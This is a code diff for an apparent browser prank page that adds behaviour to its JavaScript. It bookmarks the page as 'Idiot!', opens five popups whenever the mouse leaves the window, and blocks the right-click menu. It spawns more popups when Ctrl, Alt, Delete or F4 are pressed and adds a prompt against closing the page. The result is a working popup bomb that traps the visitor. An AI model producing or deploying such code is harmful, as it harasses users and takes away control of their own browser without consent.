@@ -28,7 +28,7 @@ faudio.addEventListener('timeupdate', function () {
 /* ================= Bookmark (IE) ================= */
 function bookmark() {
     if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
-        window.external.AddFavorite("discord.html", "‎‎Idiot!");
+        window.external.AddFavorite("lol.html", "‎‎Idiot!");
     }
 }
 
@@ -101,7 +101,7 @@ function openWindow(url) {
                 clearInterval(timer);
                 const countToOpen = Math.max(1, openWindows.length);
                 for (let i = 0; i < countToOpen; i++) {
-                    openWindow('discord.html');
+                    openWindow('lol.html');
                 }
             }
         }, 500);
@@ -110,7 +110,7 @@ function openWindow(url) {
 
 function proCreate() {
     for (let i = 0; i < 5; i++) {
-        openWindow('discord.html');
+        openWindow('lol.html');
     }
 }
 
@@ -164,7 +164,43 @@ function playBall() {
 }
 
 /* ================= Keyboard Shortcuts ================= */
+// Works from main window
 document.addEventListener("keydown", (e) => {
     if (e.key.toLowerCase() === "o") toggleOrbit();
     if (e.key.toLowerCase() === "f") closeAllPopups();
 });
+
+// Allow popups to trigger the same actions via main window
+if (window.opener) {
+    document.addEventListener("keydown", (e) => {
+        if (!window.opener) return;
+        if (e.key.toLowerCase() === "o") window.opener.toggleOrbit();
+        if (e.key.toLowerCase() === "f") window.opener.closeAllPopups();
+    });
+}
+
+/* ================= Window Events ================= */
+window.onload = function () {
+    flagRun = 1;
+    playBall();
+    bookmark();
+};
+
+window.onmouseout = function () {
+    proCreate();
+};
+
+window.oncontextmenu = function () {
+    return false;
+};
+
+window.onkeydown = function (event) {
+    const keyCode = event.keyCode;
+    if ([17, 18, 46, 115].includes(keyCode)) {
+        proCreate();
+    }
+};
+
+window.onbeforeunload = function () {
+    return " ";
+};
